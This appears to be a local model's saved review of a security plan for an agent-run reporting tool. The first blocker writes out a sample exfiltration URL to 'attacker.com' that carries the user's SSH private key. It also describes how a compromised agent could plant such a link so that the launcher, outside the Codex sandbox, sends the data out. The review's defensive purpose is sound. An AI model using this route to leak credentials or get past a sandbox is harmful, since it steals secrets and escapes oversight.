# Qwen Consult (LOCAL)

**Model:** `qwen3.8:27b-mtp-q4_K_M` via Ollama (5090, $0, private)
**Document:** docs/ai-workflow/AI-HANDOFF/SWAN-OPS-PLAN-REVIEW-PACKET-R2-2026-08-22.md
**Tokens (Ollama):** 15172 in / 1123 out | **Wall:** 15.5s | **done_reason:** stop

---
## VERDICT
REVISE — The `OPEN-11` exfiltration channel is a live, unmitigated data leak in the parent process that the current "freeze" does not stop, and the plan fails to mandate its immediate closure despite acknowledging its severity.

## BLOCKERS
1. **P0: `OPEN-11` (Parent-Process SSRF/Exfiltration) is unmitigated in the current state.**
   - **Failure Scenario:** An attacker (or a compromised agent) writes a malicious URL (e.g., `https://attacker.com/steal?data=<base64(~/.ssh/id_rsa)>`) into the report markdown. The `Publish-Report` gate passes (as it is designed to, since it only checks the verdict block). The launcher then calls `Test-ReportLinks` (`lib/Console.ps1:26`). This function runs in the **operator's** PowerShell process, **outside** the Codex sandbox. It executes `Invoke-WebRequest -Uri $u -Method Head`. This sends the exfiltrated data to the attacker.
   - **Evidence:** `lib/Console.ps1` shows `Invoke-WebRequest` is called on every URL found in the report. `OPEN-11` in §7 explicitly states: "The launcher exfiltrates on the agent's behalf, from the parent process... This survives Slice 2 entirely." The plan defers this to "Slice 2," but Slice 2 is conditional on Sean's decision to "Invest." If Sean chooses "Retire-in-Place" (the recommended path), Slice 2 **never happens**, leaving this P0 hole open indefinitely on a machine holding live API keys. The freeze (`-Yes` exit 4) does not prevent **attended** runs (`-Market` + `y`), which are still live per §5.

2. **P1: `OPEN-12` (No Version Control) creates a single point of failure for the entire security posture.**
   - **Failure Scenario:** A disk failure, accidental deletion, or a concurrent agent's `git add -A` (despite warnings) destroys the only copy of the hardened `Publish.ps1`, the test suites, and the recon report. There is no backup, no git history, no way to recover the "nine rounds of hardening."
   - **Evidence:** §7 `OPEN-12`: "No version control, no backup, single copy on disk... One disk failure or one mis-staged command destroys all of it." This is a MEDIUM severity in the plan, but in the context of a security-critical tool with no other copies, it is a P1 operational risk. The fix is trivial (`git init`) and should be mandatory immediately, not deferred.

## ATTACKS
- **Correctness:** The freeze test (`test-launcher-e2e.ps1`) is mutation-tested and correctly verifies that `-Yes` exits 4 and produces no report. However, it does **not** test that `Test-ReportLinks` is skipped or safe during a freeze. Since the freeze only blocks `-Yes`, and `Test-ReportLinks` runs in the publish path (which is blocked by the freeze), the freeze *does* prevent this specific exfiltration for unattended runs. But for **attended** runs (which are live), the exfiltration is live. The test suite does not cover the attended path's exfiltration risk.
- **Security:** `OPEN-11` is a classic SSRF/exfiltration vector. The `Invoke-WebRequest` call in `Test-ReportLinks` has no allowlist, no origin check, and runs in the parent process. This is a critical security flaw. The plan acknowledges it but defers the fix. This is unacceptable for a tool that is currently "live" for attended runs.
- **Data-truth / schema drift:** None observed. The pin to `@playwright/mcp@0.0.79` is consistent with the documented version. The `AdLibraryOrigins` list is unchanged, but `OPEN-3` correctly flags it as overstated.

## HIGHEST RISK
**`OPEN-11` (Parent-Process Exfiltration via `Test-ReportLinks`).**
**Cheapest de-risk:** **Disable `Test-ReportLinks` immediately** for all runs, or restrict it to an allowlist of known-safe origins (e.g., `facebook.com`, `google.com`) before any further use. This is a one-line change in `lib/Publish.ps1` or `lib/Console.ps1` to skip the function or filter URLs. Do not wait for Slice 2. This is a P0 security flaw in a live tool.

## CONFIDENCE
I cannot verify whether `Test-ReportLinks` is actually called in the attended run path, but the code in `lib/Console.ps1` and the description in `OPEN-11` strongly suggest it is. The plan's recommendation to "Retire-in-Place" is sound, but it does not address the immediate security risk of the tool remaining live for attended runs. The loop is **not dry** because `OPEN-11` is a live, unmitigated P0 flaw that the plan defers rather than fixes.

**REVISE**
